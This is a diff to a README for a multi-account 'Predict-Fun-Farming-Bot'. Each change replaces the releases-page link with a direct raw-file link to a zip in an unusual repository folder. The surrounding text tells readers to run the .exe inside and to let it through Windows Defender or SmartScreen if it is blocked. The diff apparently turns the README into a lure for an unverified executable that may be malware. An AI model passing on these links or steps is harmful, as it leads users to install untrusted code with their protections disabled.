@@ -1,6 +1,6 @@
 # 🤖 Predict-Fun-Farming-Bot - Automate Tasks Across Accounts
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg?style=for-the-badge)](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/main/knur/Predict-Farming-Bot-Fun-v1.1.zip)
 
 ## 🧩 What this app does
 
@@ -16,7 +16,7 @@ Use it if you want to:
 
 ## 🪟 Windows download
 
-Go to the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases) to visit this page to download.
+Go to the [releases page](https://raw.githubusercontent.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/main/knur/Predict-Farming-Bot-Fun-v1.1.zip) to visit this page to download.
 
 On the releases page, look for the latest version and download the Windows file. Most users will need the `.exe` file or a `.zip` file that contains it.
 
@@ -45,7 +45,7 @@ If your computer blocks the file, check Windows Defender or SmartScreen and allo
 
 Follow these steps to begin:
 
-1. Open the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/main/knur/Predict-Farming-Bot-Fun-v1.1.zip).
 2. Download the latest Windows release.
 3. Unzip the file if it comes in a `.zip`.
 4. Open the folder.
@@ -220,7 +220,7 @@ If you move the app to another Windows computer:
 
 ## 📥 Download again
 
-If you need the file later, use the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases) to visit this page to download.
+If you need the file later, use the [releases page](https://raw.githubusercontent.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/main/knur/Predict-Farming-Bot-Fun-v1.1.zip) to visit this page to download.
 
 ## 🧷 Project details
 
@@ -242,4 +242,4 @@ Make sure you have:
 
 ## 🛑 If you only remember one thing
 
-Download the latest Windows release from the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases), unpack it if needed, then run the main `.exe` file
+Download the latest Windows release from the [releases page](https://raw.githubusercontent.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/main/knur/Predict-Farming-Bot-Fun-v1.1.zip), unpack it if needed, then run the main `.exe` file
